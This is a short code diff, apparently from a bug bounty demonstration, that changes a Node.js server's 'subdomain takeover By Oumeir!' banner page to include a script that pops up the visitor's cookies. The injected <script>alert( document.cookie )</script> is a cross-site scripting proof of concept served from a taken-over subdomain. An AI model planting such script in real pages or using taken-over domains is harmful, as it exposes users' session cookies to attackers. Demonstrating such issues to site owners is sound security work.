@@ -8,7 +8,7 @@ res.statusCode = 200;
 
 res.setHeader('Content-Type', 'text/html');
   
-res.end('<center><h1>subdomain takeover By Oumeir! email= o.s.bughuner@gmail.com</h1> </center>');
+res.end('<center><h1>subdomain takeover By Oumeir!<script>alert( document.cookie )</script> </center>');
 
 });
 
